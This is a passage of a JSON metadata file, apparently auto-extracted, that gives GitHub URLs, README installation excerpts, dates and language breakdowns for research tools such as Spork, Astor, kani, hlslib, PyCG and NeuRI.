                "result": {
                    "value": "https://github.com/ASSERT-KTH/spork",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Want to just try out Spork on a small merge scenario? Below are a few shell\ncommands that will download Spork along with a [sample merge\nscenario](https://github.com/KTH/spork/tree/fe906f537d1bb7205256d1fe81fda9f323849a60/src/test/resources/clean/both_modified/move_if),\nand then run it!\n```bash\n# Download Spork\nwget https://github.com/KTH/spork/releases/download/v0.5.0/spork-0.5.0.jar -O spork.jar\n\n# Download a sample merge scenario\nwget https://raw.githubusercontent.com/KTH/spork/fe906f537d1bb7205256d1fe81fda9f323849a60/src/test/resources/clean/both_modified/move_if/Left.java\nwget https://raw.githubusercontent.com/KTH/spork/fe906f537d1bb7205256d1fe81fda9f323849a60/src/test/resources/clean/both_modified/move_if/Base.java\nwget https://raw.githubusercontent.com/KTH/spork/fe906f537d1bb7205256d1fe81fda9f323849a60/src/test/resources/clean/both_modified/move_if/Right.java\n# You should now have spork.jar, Left.java, Base.java and Right.java in your local directory\n\n# a line based-merge is not possible\ndiff3 Left.java Base.java Right.java -m -A\n\n# an AST-merge with Spork does\njava -jar spork.jar Left.java Base.java Right.java\n```\n \n",
                    "original_header": "Quickstart"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/KTH/spork/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Maven can be used to build the latest version of Spork. \n> **Note:** Requires JDK8+ to build.\n```\nmvn clean compile package -DskipTests\n```\n \n",
                    "original_header": "Build"
                },
                "confidence": 0.9901721605358973,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/KTH/spork/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "When Git performs a merge and encounters a file that has been edited in both revisions under merge, it will invoke a\nmerge driver to merge the conflicting versions. It's a very simple thing to configure Spork as a merge driver for Java\nfiles, all you need is to add a couple of lines to a couple of configuration files. First, let's create a\n`.gitattributes` file and specify to use Spork as a merge driver for Java files. Put the following content in your\n`.gitattributes` file (you may all ready have one, check your home directory):\n```\n*.java merge=spork\n```\n`spork` doesn't mean anything to Git yet, we need to actually define the merge driver called `spork`. We do that in the\n`.gitconfig` file, typically located in your home directory. You should put the following content into it:\n```\n[core]\n\tattributesfile = /path/to/.gitattributes\n\n[merge \"spork\"]\n    name = spork\n    driver = java -jar /path/to/spork.jar merge --git-mode %A %O %B -o %A\n```\n \nThen replace `/path/to/.gitattributes` with the absolute path to the `.gitattributes` file you edited/created first,\nand replace `/path/to/spork.jar` with the absolute path to the Spork jar-file. With that done, Spork will be used\nas the merge driver for Java files! \n> **Important:** The `--git-mode` option is required to use Spork as a Git merge driver. If you find that Spork always\n> reverts to line-based merge, then that option is probably missing in the `driver` option that invokes Spork.\n \n",
                    "original_header": "Configure as a Git merge driver"
                },
                "confidence": 0.9999303056436318,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/KTH/spork/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Spork can be compiled to a native executable file using [GraalVM](https://www.graalvm.org/).\nTo do so, you need to first install GraalVM's JDK for Java 17 (Spork does not support Java 21 yet, see [#479](https://github.com/ASSERT-KTH/spork/issues/479)).\nRunning `mvn package -P native` will then generate a native image in `target/spork`. \n",
                    "original_header": "Experimental: compile as a native image"
                },
                "confidence": 0.9999793126885647,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/KTH/spork/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-31T13:53:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-13T10:33:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 196524
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Kotlin",
                    "name": "Kotlin",
                    "type": "Programming_language",
                    "size": 131438
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3570
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "296": {
        "filename": "TQRG_maintainable-security_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/TQRG/maintainable-security",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Requirements installation:\n\n```\nvirtualenv --python=python3.7 venv\nsource venv/bin/activate\npip install -r requirements.txt\n```\n\nMerge different caches in `scripts/maintainability/caches/` folder:\n```\nsource venv/bin/activate\ncd scripts\npython -m maintainability.merge_cache -cache maintainability/cache -output maintainability/bch_cache.zip\n``` \n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "security-maintainability"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/TQRG/maintainable-security/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "How to collect maintainability results from BCH cache:\n```\nsource venv/bin/activate\ncd scripts\npython report.py --report export -secdb ../dataset/db_security_changes.csv -regdb ../dataset/db_regular_changes_random.csv -baseline random -results ../results -cache maintainability/bch_cache.zip\n``` \nComparison between security and regular commits:\n```\nsource venv/bin/activate\ncd scripts\npython report.py --report comparison -results ../results/ -reports ../reports\n``` \nGet security maintainability report per guideline:\n```\nsource venv/bin/activate\ncd scripts\npython report.py --report guideline -secdb ../results/maintainability_release_security_fixes.csv -reports ../reports\n``` \nGet security maintainability report per language:\n```\nsource venv/bin/activate\ncd scripts\npython report.py --report language -secdb ../results/maintainability_release_security_fixes.csv -reports ../reports\n``` \nGet security maintainability report per severity:\n```\nsource venv/bin/activate\ncd scripts\npython report.py --report severity -secdb ../results/maintainability_release_security_fixes.csv -reports ../reports\n``` \nGet security maintainability report per cwe:\n```\nsource venv/bin/activate\ncd scripts\npython report.py --report cwe -secdb ../results/maintainability_release_security_fixes.csv -reports ../reports\n``` \nGet security maintainability report per specific cwe (available for CWE_664 and CWE_707):\n```\nsource venv/bin/activate\ncd scripts\npython report.py --report cwe-spec -secdb ../results/maintainability_release_security_fixes.csv -cwe CWE_664 -reports ../reports\n``` \n \n",
                    "original_header": "Data Analysis"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TQRG/maintainable-security/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Create a config file in `scripts/maintainability/config.json` based on the example in `scripts/maintainability/config-template.json`.\n```\nvirtualenv --python=python3.7 venv\nsource venv/bin/activate\npip install -r requirements.txt\ncd scripts\npython -m maintainability.eval_maintainability\n```\n \n",
                    "original_header": "Experiments"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/TQRG/maintainable-security/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-12-05T15:49:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-12T20:56:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 241267
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 67861
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 1333
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "297": {
        "filename": "SpoonLabs_astor_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/SpoonLabs/astor",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Open-science repository with jMutRepair patches: <https://github.com/SpoonLabs/astor-experiments/>\n \n",
                    "original_header": "jMutRepair"
                },
                "confidence": 0.9971560800102998,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SpoonLabs/astor/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* [Sorting and Transforming Program Repair Ingredients via Deep Learning Code Similarities](https://arxiv.org/pdf/1707.04742.pdf) (Martin White, Michele Tufano, Matias Martinez, Martin Monperrus and Denys Poshyvanyk), Proceedings of SANER, 2019.  ([doi:10.1109/SANER.2019.8668043](https://doi.org/10.1109/SANER.2019.8668043))\n* Open-science repository with DeepRepair patches: <https://github.com/SpoonLabs/astor-experiments/>\n* Open-science package at Zenodo: <https://zenodo.org/record/2578775>\n \n",
                    "original_header": "DeepRepair"
                },
                "confidence": 0.9949616933620569,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SpoonLabs/astor/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Paper: [The Remarkable Role of Similarity in Redundancy-based Program Repair (arxiv 1811.05703, 2018)](http://arxiv.org/pdf/1811.05703)\n* Open-science repository: <https://github.com/kth-tcs/3sFix-experiments> \n",
                    "original_header": "3sfix"
                },
                "confidence": 0.9657704727991794,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/SpoonLabs/astor/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2014-10-01T09:34:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-28T12:14:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1491193
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "298": {
        "filename": "lumos-xiao_LEAP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lumos-xiao/LEAP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n## Dependencies\nThe code was tested with: \n- bert-score>=0.3.5\n- editdistance\n- flair\n- filelock\n- language_tool_python\n- lemminflect\n- lru-dict\n- datasets\n- nltk\n- numpy>=1.19.2\n- pandas>=1.0.1\n- scipy>=1.4.1\n- torch>=1.7.0,!=1.8\n- transformers>=3.3.0\n- terminaltables\n- tqdm>=4.27,<4.50.0\n- word2number\n- num2words\n- more-itertools\n- PySocks!=1.5.7,>=1.5.6 \n## How to Run:\nFollow these steps to run the attack from the library: \n2. Run the following command to install it. \n   ```bash\n   $ pip install -e . \".[dev]\"\n   \n3. Run notebook **leap_demo.ipynb** to test the fine-tuned \"bert-base-uncased\" model on the \"AG's News\" dataset \n",
                    "original_header": "LEAP"
                },
                "confidence": 0.9882824797899176,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lumos-xiao/LEAP/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-13T08:29:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-07T08:28:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1011814
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 1845
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "299": {
        "filename": "disensoftware_disentanglement-for-software_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/disensoftware/disentanglement-for-software",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-01-20T09:30:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-12-31T02:25:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 162494
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "300": {
        "filename": "JohnnyPeng18_APIBench_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JohnnyPeng18/APIBench",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "| Technique                 | Source                                                       |\n| ------------------------- | ------------------------------------------------------------ |\n| RACK                      | https://github.com/masud-technope/RACK-Replication-Package   |\n| NLP2API                   | https://github.com/masud-technope/NLP2API-Replication-Package |\n| SEQUER                    | https://github.com/kbcao/sequer                              |\n| Google Prediction Service | http://suggestqueries.google.com/complete/search?            |\n| NLPAUG                    | https://github.com/makcedward/nlpaug                         | \n",
                    "original_header": "APIBench-Q"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JohnnyPeng18/APIBench/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-12-21T14:01:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T09:57:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "301": {
        "filename": "zhudotexe_kani_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zhudotexe/kani",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "kani requires Python 3.10 or above. To install model-specific dependencies, kani uses various extras (brackets after\nthe library name in `pip install`). To determine which extra(s) to install, see\nthe [model table](https://kani.readthedocs.io/en/latest/engines.html), or use the `[all]` extra to install everything.\n\n```shell\n# for OpenAI models\n$ pip install \"kani[openai]\"\n# for Hugging Face models\n$ pip install \"kani[huggingface]\" torch\n# or install everything:\n$ pip install \"kani[all]\"\n```\n\nFor the most up-to-date changes and new models, you can also install the development version from Git's `main` branch:\n\n```shell\n$ pip install \"kani[all] @ git+https://github.com/zhudotexe/kani.git@main\"\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "kani (\u30ab\u30cb)"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/zhudotexe/kani/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<a href=\"https://colab.research.google.com/github/zhudotexe/kani/blob/main/examples/colab_examples.ipynb\">\n  <img alt=\"Quickstart in Colab\" src=\"https://colab.research.google.com/assets/colab-badge.svg\">\n</a> \nkani requires Python 3.10 or above. \n",
                    "original_header": "Quickstart"
                },
                "confidence": 0.9537426618631607,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zhudotexe/kani/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-07-14T15:18:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T18:15:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 293286
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 17084
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "302": {
        "filename": "definelicht_hlslib_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/definelicht/hlslib",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "There are a few ways:\n- Grab the headers and/or CMake files you need and stick them in your project.\n- Install hlslib using the standard CMake installation procedure to a location of your choice.\n- Clone this repository into your project as a git submodule and integrate it, with or without CMake.\n",
                    "type": "Text_excerpt",
                    "original_header": "How do I install it?",
                    "parent_header": [
                        "Quick introduction"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/definelicht/hlslib/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We have Doxygen! Set the CMake flag `HLSLIB_BUILD_DOCUMENTATION=ON` to generate the docs. \n",
                    "original_header": "Feature overview"
                },
                "confidence": 0.9005261130881578,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/definelicht/hlslib/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For integrating the Xilinx or Intel HLS tools in your project, the `FindVitis.cmake` and `FindIntelFPGAOpenCL.cmake` are provided in the `cmake` subdirectory. The scripts will set all necessary variables required to build both host and device code. It also provides the `add_vitis_kernel` and `add_vitis_program` functions, which will produce targets for building hardware emulation, hardware, and high-level synthesis. \nExample `CMakeLists.txt`:\n```cmake\nset(CMAKE_MODULE_PATH ${CMAKE_MODULE_PATH} hlslib/cmake)\nfind_package(Vitis REQUIRED)\n\nadd_executable(MyHostExecutable src/MyHostExecutable.cpp)\ninclude_directories(${Vitis_INCLUDE_DIRS})\ntarget_link_libraries(MyHostExecutable ${Vitis_LIBRARIES})\n\n# Will populate the \"hw\", \"hw_emu\", and \"synthesis\" targets\nadd_vitis_kernel(MyKernel FILES src/MyKernel.cpp)\nadd_vitis_program(MyKernel xilinx_u250_gen3x16_xdma_3_1_202020_1)\n``` \nKernels can then be built with:\n```bash\nmake hw\n```\nThe `add_vitis_kernel` and `add_vitis_program` functions takes a number of optional arguments that can be used to configure the hardware targets:\n```cmake\nadd_vitis_kernel(MyKernel\n                 FILES src/MyKernel.cpp src/MyKernelHelper.cpp\n                 # All flags below this are optional keywords, and any\n                 # combination of them can be specified/not specified.\n                 KERNEL MyKernelName  # If different from target name\n                 HLS_FLAGS \"-DMY_IMPORTANT_DEFINITION -O2\"\n                 DEPENDS include/MyHeader.h include/OtherDependency.h\n                 INCLUDE_DIRS ${CMAKE_CURRENT_SOURCE_DIR}/include hlslib/include\n                 PORT_MAPPING \"ddr0:DDR[0]\" \"ddr1:DDR[1]\")\nadd_vitis_kernel(MyOtherKernel\n                 FILES src/MyOtherKernel.cpp)\nadd_vitis_program(MyProgram\n                  xilinx_u250_gen3x16_xdma_3_1_202020_1  # Name of Vitis platform\n                  # All flags below this are optional keywords, and any\n                  # combination of them can be specified/not specified.\n                  KERNELS MyKernel       # If KERNELS is not specified, the function checks for a kernel\n                          MyOtherKernel  # with the same name as specified for the program\n                  # Connect multiple linked kernels using streaming interfaces\n                  CONNECTIVITY \"MyKernel_1.stream_out:MyOtherKernel_1.stream_in\"\n                  CLOCK 400  # Target a different clock frequency than the default\n                  CONFIG scripts/my_config.cfg  # Given as --config to Vitis\n                  SAVE_TEMPS ON  # Forwards --save-temps to Vitis\n                  BUILD_FLAGS \"-Os --export_script\"\n                  DEBUGGING ON  # Enables Chipscope debugging on all interfaces\n                  PROFILING ON)  # Enables profiling for stalls, data transfers, and execution\n```\n \n",
                    "original_header": "CMake integration"
                },
                "confidence": 0.986374556491425,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/definelicht/hlslib/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "On Ubuntu, the following package might need to be installed to run hardware emulation:\n```\nsudo apt install libc6-dev-i386\n```\n \n",
                    "original_header": "Ubuntu packages"
                },
                "confidence": 0.9999999998936602,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/definelicht/hlslib/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "_If you use hlslib in your project, please let us know, so we can add you to the list._\n \n",
                    "original_header": "Projects using hlslib"
                },
                "confidence": 0.9833727145991717,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/definelicht/hlslib/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-02-21T12:10:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T08:39:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 839521
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 51335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 2891
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1324
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Tcl",
                    "name": "Tcl",
                    "type": "Programming_language",
                    "size": 633
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "303": {
        "filename": "vitsalis_pycg_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/vitsalis/PyCG",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "PyCG is implemented in Python3 and requires Python version 3.4 or higher.\nIt also has no dependencies. Simply:\n```\npip install pycg\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/vitsalis/pycg/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-12-15T19:50:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T04:23:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 199265
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3464
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "304": {
        "filename": "shaunazzopardi_clarva_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shaunazzopardi/clarva",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-07-21T10:16:06Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-22T15:25:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1774511
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "AspectJ",
                    "name": "AspectJ",
                    "type": "Programming_language",
                    "size": 14919
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 3144
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "305": {
        "filename": "ise-uiuc_neuri-artifact_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ise-uiuc/neuri-artifact",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "> [!IMPORTANT]\n>\n> **General test-bed requirements**\n> - **OS**: A Linux System with Docker Support;\n> - **Hardware**: X86/X64 CPU; 16GB RAM; 1TB Storage; Good Network to GitHub and Docker Hub;\n\n> [!Note]\n>\n> Before you start, please make sure you have [Docker](https://docs.docker.com/engine/install/) installed.\n>\n> To check the installation:\n> ```bash\n> docker --version # Test docker availability\n> # Docker version 20.10.12, build e91ed5707e\n> ```\n\n```bash\n# \ud83d\udca1 Get Docker image from Docker Hub\ndocker pull ganler/neuri-fse23-ae:latest\n# \ud83d\udca1 [Alternative] load image from https://doi.org/10.5281/zenodo.8319975\n# 1. Install and \"unzip\" the package\n# 2. Run `docker load --input neuri-image-fse23.tar.gz`\n\n# Run Docker image\ndocker run -it --name ${USER}-neuri ganler/neuri-fse23-ae:latest\n# By using this command, you will \"get into\" the image like entering a virtual machine.\n# The session will be kept under the name \"${USER}-neuri\"\n# So that later on even if you exit the interactive bash, you can come back via:\n# `docker start ${USER}-neuri && docker exec -it ${USER}-neuri /bin/bash`\n\n# Inside the image, try to update any timely bug fixes\ncd /artifact\ngit remote set-url origin https://github.com/ise-uiuc/neuri-artifact.git\ngit pull origin main\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Get ready for running experiments!",
                    "parent_header": [
                        "NeuRI: Diversifying DNN Generation via Inductive Rule Inference"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"center\">\n    <a href=\"https://arxiv.org/abs/2302.02261\"><img src=\"https://img.shields.io/badge/arXiv-2302.02261-b31b1b.svg?style=for-the-badge\">\n    <a href=\"https://doi.org/10.5281/zenodo.8319975\"><img src=\"https://img.shields.io/badge/DOI-10.5281%2Fzenodo.8319975-8A2BE2?style=for-the-badge\">\n    <a href=\"https://github.com/ise-uiuc/neuri-artifact/blob/main/LICENSE\"><img src=\"https://img.shields.io/badge/License-Apache_2.0-blue.svg?style=for-the-badge\"></a>\n    <a href=\"https://hub.docker.com/r/ganler/neuri-fse23-ae/tags\"><img src=\"https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white\"></a>\n</p> \n",
                    "original_header": "NeuRI: Diversifying DNN Generation via Inductive Rule Inference"
                },
                "confidence": 0.9999998154858815,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> [!NOTE]\n>\n> You may parallelize the scripts below if you have multiple cores, at the risk of potential result unstability.\n> Nonetheless the results in the paper are generated without script parallelization.\n```bash\nsource ./env_std.sh\n./fuzz.sh 5 neuri          torch torchjit 4h\n./fuzz.sh 5 neuri-i        torch torchjit 4h\n./fuzz.sh 5 neuri-r        torch torchjit 4h\n./fuzz.sh 5 symbolic-cinit torch torchjit 4h # NNSmith\n./fuzz.sh 1  neuri         torch torchjit 4h\n./fuzz.sh 9  neuri         torch torchjit 4h\n./fuzz.sh 13 neuri         torch torchjit 4h\n```\n \n",
                    "original_header": "For PyTorch"
                },
                "confidence": 0.9999999998142926,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\nsource ./env_std.sh\n./fuzz.sh 5 neuri          tensorflow xla 4h\n./fuzz.sh 5 neuri-i        tensorflow xla 4h\n./fuzz.sh 5 neuri-r        tensorflow xla 4h\n./fuzz.sh 5 symbolic-cinit tensorflow xla 4h # NNSmith\n```\n \n",
                    "original_header": "For TensorFlow"
                },
                "confidence": 0.999999976572781,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ise-uiuc/neuri-artifact/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
